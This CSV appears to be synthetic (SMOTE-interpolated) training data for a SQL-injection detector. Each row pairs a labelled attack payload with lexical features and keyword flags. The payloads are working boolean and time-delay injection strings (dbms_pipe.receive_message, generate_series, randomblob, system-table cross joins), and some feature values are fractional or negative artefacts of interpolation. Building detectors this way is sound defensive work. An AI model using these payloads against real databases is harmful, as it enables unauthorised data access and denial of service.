id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000088,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""%""  =  """,nearest_attack_euclidean,R000038,1.585411475075595,140.0,35.0,3.893547573413456,51.0,10.0,53.0,26.0,0.36428571428571427,0.07142857142857142,0.37857142857142856,0.18571428571428572,1.2116946247176539,1.788305375282346,0.0,0.0,0.0,1.0,0.0,11.0,1.0,2.0,1.0,7.0,0.4038982082392179,0.596101791760782,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000089,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000280,0.9123919693468524,137.20364215794737,35.77814705231584,3.9603338263513583,46.79635784205264,21.0,50.0,19.40728431589472,0.3410837746185172,0.1530584742771134,0.36442493875503185,0.1414328123493376,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,8.0,0.0,1.0,1.0,5.407284315894721,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.20364215794736074,2.0,0.0,1.0,1.0,0.7963578420526394,0.20364215794736068,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000090,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,nearest_attack_euclidean,R000017,0.0,138.0,28.0,3.3987538995167617,46.0,13.0,64.0,15.0,0.3333333333333333,0.09420289855072464,0.463768115942029,0.10869565217391304,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,-2.220446049250313e-16,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000091,attack,boolean,"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000298,0.8088532462091901,133.8016593143854,31.0,3.9738577108604773,67.8016593143854,8.0,41.0,17.0,0.5064116337398736,0.05982889288001531,0.3066230760100785,0.12713639737003254,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.0,1.0,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000092,attack,boolean,"1%""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000186,0.5263952504967675,138.81690340618175,30.450710218545247,3.88561271753349,62.81690340618175,10.0,44.0,22.0,0.45251197262380427,0.07203789833897312,0.3169667526914817,0.15848337634574086,0.0,1.0,2.0,0.0,1.0,1.0,0.0,7.0,1.0,5.0,4.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.816903406181749,0.18309659381825105,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000093,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ctdc""  =  ""ctdc",nearest_attack_euclidean,R000139,1.1904715154723642,136.47379094454735,30.895163778189342,4.17037896057288,76.89516377818934,8.0,36.05241811090533,15.526209055452664,0.563396734273975,0.05862009834927122,0.2642012987406007,0.11378186863615312,0.0,3.999999999999999,0.0,0.0,1.0,1.5262090554526642,0.0,4.0,0.0,0.0,2.0,2.5262090554526644,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000094,attack,boolean,"1'+  (  select 'zxxh' where 4065  =  4065 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000238,0.7501253055508906,132.24627680216085,36.0,3.9803388437417646,46.01489279135655,21.0,47.72393761512603,17.507446395678276,0.34799446563895564,0.1587963196146401,0.3608014942069513,0.132407720539453,2.5074463956782767,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,7.246276802160861,0.0,1.0,1.0,5.753723197839139,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7537231978391383,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.753723197839139
SMOTE_000095,attack,boolean,"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # hlrg",nearest_attack_euclidean,R000148,0.47257461586427957,133.49531205650712,31.752343971746445,4.226331828068806,76.12382801412677,8.876171985873222,34.4953120565071,14.0,0.5702664732772252,0.06652066657222847,0.2583302724106363,0.10488258773991002,0.12382801412677691,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.123828014126777,0.0,0.0,2.8761719858732233,2.0,0.12382801412677685,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.8761719858732231,0.12382801412677691,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000096,attack,boolean,"1%""  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000123,0.14349723381446258,130.0,30.22797800925838,4.013906505154961,71.0,8.075992669752793,34.848014660494414,16.075992669752793,0.5461538461538461,0.06212302053655995,0.26806165123457243,0.12366148207502149,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.924007330247207,1.0,0.0,2.0759926697527926,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000097,attack,boolean,"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000099,0.7438546152575798,142.0,31.264702628705773,3.8697164559048747,42.0,23.747059474258847,52.0,24.252940525741153,0.29577464788732394,0.16723281319900596,0.36619718309859156,0.17079535581507854,0.0,0.2529405257411548,2.0,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,10.0,0.0,0.2529405257411549,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000098,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000005,1.8585837979503788,132.20735787112037,30.0,3.747667782420828,49.0,14.0,50.7658862968963,18.441471574224074,0.3707600834367579,0.10593145241050227,0.3838407226730268,0.139467741479713,1.3244147226722252,1.6755852773277746,0.0,0.0,0.0,1.0,0.0,10.441471574224074,0.0,1.0,3.0,1.0,0.4414715742240751,0.5585284257759249,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000099,attack,boolean,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R000156,1.1740714376013592,133.8877927341283,28.66831089880753,4.022869617673769,75.55117093651326,6.3366217976150585,37.0,15.0,0.5640982822444458,0.04749543661796981,0.27636600773251196,0.11204027340507242,1.8877927341283138,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,5.0,0.0,0.0,2.556103632935843,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000100,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000068,0.6011106202341564,134.3801795757728,33.38017957577279,3.710500559541057,37.0,15.0,56.0,26.380179575772797,0.2753418107073746,0.1116250583948816,0.4167335513408913,0.1962995795568525,0.0,1.0,2.0,0.0,0.0,1.0,0.0,12.0,0.38017957577279626,2.0,1.0,9.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000101,attack,boolean,"1%'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000303,0.9632884194894066,138.94027956407555,29.514930108981112,3.8615448966355195,71.0,8.0,42.940279564075546,17.0,0.5111166408319426,0.057590607417683674,0.3089127109877959,0.12238004076257782,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.485069891018887,0.5149301089811128,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000102,attack,boolean,"1%"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """,nearest_attack_euclidean,R000168,0.5403678114216767,140.6762947379424,31.47051789517696,4.1736191453690274,74.0,8.73525894758848,38.47051789517696,19.47051789517696,0.5261619301630648,0.06206025074103437,0.2734367249067223,0.13834109418917862,0.0,3.999999999999999,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.7352589475884805,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000103,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000026,1.0613301532507557,132.57488589141724,30.57488589141725,3.5829329322602907,45.13767116287413,11.437214728543127,56.71255705429137,19.287442945708626,0.3405544913214717,0.08615804416856175,0.4278205017727091,0.1454669627372575,5.287442945708626,-1.1102230246251565e-16,0.0,1.0,0.0,1.2874429457086254,0.0,10.712557054291375,0.0,0.0,1.0,2.2874429457086256,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7125570542913746,0.0,2.7755575615628914e-17,0.0,1.2874429457086254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000104,attack,boolean,"1"" where 6785  =  6785 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000197,0.24908863346466134,138.38915021340495,34.0,4.28842562612159,70.0,16.0,37.38915021340493,15.0,0.5058562709257836,0.11562429049732197,0.27012166623565514,0.10839777234123933,0.0,0.9027124466487668,2.0,0.0,1.0,2.0,0.0,4.097287553351233,0.0,0.0,2.0,5.0,0.0,0.9027124466487668,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000105,attack,boolean,-7239' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'cswv'  =  'cswv,nearest_attack_euclidean,R000072,1.2171954925714683,138.88415533356903,36.140258889281704,4.333348183818381,63.37194822214366,16.884155333569023,39.0,19.628051777856342,0.45638013373750075,0.12147377219475602,0.28084035151151243,0.14130574255623082,8.0,-1.1102230246251565e-16,0.6280517778563406,0.0,0.0,2.0,0.0,4.0,0.0,0.0,-2.220446049250313e-16,6.62805177785634,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.3719482221436594,0.6280517778563406,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000106,attack,boolean,"1   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000199,1.2286478265674012,137.4679514109929,29.489317136997634,3.961446562971135,74.9359028219858,8.0,39.5320485890071,15.0,0.5449423551734331,0.058202305793062674,0.2877260156715116,0.1091293233619925,0.4893171369976348,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.510682863002366,0.0,0.0,2.0,4.0,0.48931713699763474,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000107,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""vkqt""  =  ""vkqt",nearest_attack_euclidean,R000076,0.8489911272772634,133.0,35.40138328600462,3.760501123182593,42.0,15.0,56.0,20.0,0.3157894736842105,0.11278195488721804,0.42105263157894735,0.15037593984962405,2.79815561866051,3.20184438133949,0.0,1.0,0.0,2.0,0.0,10.0,0.0,0.0,1.0,3.0,1.0,0.8004610953348725,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000108,attack,boolean,"1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000003,0.6425558240467082,137.88312797735944,37.66234598301958,3.9331085965237067,42.883127977359436,23.0,53.77921800566014,18.22078199433986,0.31091252046638435,0.16683170557129642,0.39012600072464826,0.132129773237671,3.0,-1.1102230246251565e-16,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.220781994339859,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.22078199433985846,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2207819943398586
SMOTE_000109,attack,boolean,"1""  )   where 1699  =  1699 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000117,1.063554192485254,141.5309167101347,33.0,4.19737914376699,69.0,16.0,41.0,15.530916710134711,0.48753205209273326,0.11305091063019901,0.28969295848988497,0.10972407878718278,0.0,0.5309167101347114,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.5309167101347114,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000110,attack,boolean,"1'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000091,0.3146278679527577,130.0,30.289225108729045,4.013677087922865,66.01228788055165,8.144612554364523,39.843099565083826,16.0,0.5077868298503974,0.06265086580280402,0.30648538126987557,0.12307692307692308,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.7107748912709555,0.0,0.0,2.1446125543645222,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000111,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   6977  =  6977",nearest_attack_euclidean,R000285,0.039101801071274714,132.0,30.952010695291005,4.1934192605326235,72.0,11.976005347645502,35.04798930470899,12.976005347645502,0.5454545454545454,0.09072731323973865,0.26551507049021966,0.09830307081549622,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.023994652354498,0.0,0.0,2.976005347645502,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000112,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000230,0.46307957724177357,140.17354712341324,30.17354712341323,4.098181534917525,67.17354712341323,18.0,36.0,19.0,0.47921321884544915,0.12841317891482074,0.25682635782964147,0.13554724441008859,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.0,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.17354712341323042,0.8264528765867696,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000113,attack,boolean,"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000240,1.4385782989937759,132.0,34.0,3.776499448861826,42.0,21.0,53.0,16.0,0.3181818181818182,0.1590909090909091,0.4015151515151515,0.12121212121212122,0.4729958440538977,0.5270041559461022,2.0,0.0,1.0,2.0,0.0,8.0,0.0,1.0,1.0,5.0,0.47299584405389783,0.5270041559461023,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000114,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""uidb"" like ""uidb",nearest_attack_euclidean,R000254,0.23901033518050388,136.0,28.817916333375926,4.14745390685454,84.0,3.8179163333759245,33.36416733324815,14.817916333375926,0.6176470588235294,0.028072914215999445,0.2453247598032952,0.10895526715717592,0.0,3.0,0.0,0.0,1.0,0.0,0.0,4.182083666624075,0.0,0.0,2.8179163333759254,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000115,attack,boolean,"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000078,0.712558157883289,138.0,32.0,3.5798589618506442,36.26966947695731,15.730330523042689,60.0,26.0,0.2628236918620095,0.11398790234088904,0.43478260869565216,0.18840579710144928,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,13.0,0.0,2.0,1.0,9.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.26966947695731136,0.7303305230426886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000116,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000004,1.9892379660088801,139.52386166836607,31.349241112244037,3.9228700872661757,46.46041305867111,16.0,50.82537944387798,26.238069165816974,0.3323147115391792,0.11472753797152771,0.36459252266012687,0.18836522782916623,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.4126897219389902,0.0,10.0,0.8253794438779807,2.0,1.0,7.412689721938991,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.4126897219389902,0.5873102780610097,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
